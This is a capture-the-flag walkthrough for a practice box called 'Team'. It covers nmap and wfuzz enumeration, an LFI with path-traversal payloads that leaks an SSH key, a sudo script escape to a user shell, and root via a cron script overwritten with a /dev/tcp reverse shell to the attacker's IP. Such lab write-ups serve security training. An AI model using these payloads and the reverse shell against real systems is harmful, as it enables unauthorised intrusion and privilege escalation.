# Team

## Nmap

```
sudo nmap 10.10.93.15 -p- -sS -sV  

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

{% hint style="info" %}
Before starting add team.thm into /etc/hosts.
{% endhint %}

For FTP on port 21 anonymous login is not allowed.

![](<../../../.gitbook/assets/image (986).png>)

Moving onto port 80 the root page reveals the following:

![http://team.thm/](<../../../.gitbook/assets/image (987).png>)

After further enumeration we are unable to identify anything too interesting. /Robots.txt contains the entry 'dale' which I tried against Hydra for SSH and FTP with no luck.

![](<../../../.gitbook/assets/image (988).png>)

Fuzzing for subdomains with wfuzz revelas the 'dev' sub domain.

```
wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://team.thm" -H "Host: FUZZ.team.thm" -t 42 --hl 373  
```

![](<../../../.gitbook/assets/image (989).png>)

This was added to the hosts files in /etc/hosts:

```
10.10.93.15 team.thm
10.10.93.15 dev.team.thm
```

Browsing to the subdomain reveals the following:

![](<../../../.gitbook/assets/image (990).png>)

Progressing with the placeholder link takes us to the following URL:[http://dev.team.thm/script.php?page=teamshare.php](http://dev.team.thm/script.php?page=teamshare.php).

Testing for LFI proves successfulon /etc/passwd. I used wfuzz to further enumerate LFI.

```
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI.txt --hw 0 http://dev.team.thm/script.php?page=/../../../../../FUZZ 
```

![](<../../../.gitbook/assets/image (991).png>)

Checking the following below reveals a SSH key for the user Dale.

{% embed url="http://dev.team.thm/script.php?page=/../../../../../etc/ssh/sshd_config" %}

![](<../../../.gitbook/assets/image (992).png>)

Copy the key to the attacking machine and use `chmod` to set the correct permissions.

```
chmod 600 id_rsa
```

{% hint style="info" %}
Ensure a space is present underneath the line '-----END OPENSSH PRIVATE KEY-----' otherwise the key will be marked as invalid when connecting to SSH.
{% endhint %}

Checking `sudo -l` we are able to run `/home/gyles/admin_checks` as the user gyles without a password.

![](<../../../.gitbook/assets/image (1461).png>)

Reading the file with `cat` shows that the script will prompt us for input for the name of ther person backing up the data and the date.

![](<../../../.gitbook/assets/image (1462).png>)

When running the script I was able to escape it by entering '`/bin/bash`'. As per below we now have shell as gyles.

![](<../../../.gitbook/assets/image (1463).png>)

Upgrade our shell to something nice to use:

```
/usr/bin/script -qc /bin/bash /dev/null
```

From here with some manual enumeraiton we find a file called script.sh in the /opt/ directory.

![](<../../../.gitbook/assets/image (1464).png>)

As per the comments in the script this has been set to run by cron every minute. I was able to delete the file which means we can replace it with a reverse shell.

![](<../../../.gitbook/assets/image (1465).png>)

The following commands was then run to echo in a reverse shell.

```
gyles@TEAM: echo '#!/bin/bash' > script.sh
gyles@TEAM: echo 'sh -i >& /dev/tcp/10.14.3.108/80 0>&1' >> script.sh
gyles@TEAM: chmod +x script.sh
```

I then started a `netcat` listener on my attacking machine and soon enough gained a shell as root.

![](<../../../.gitbook/assets/image (1466).png>)
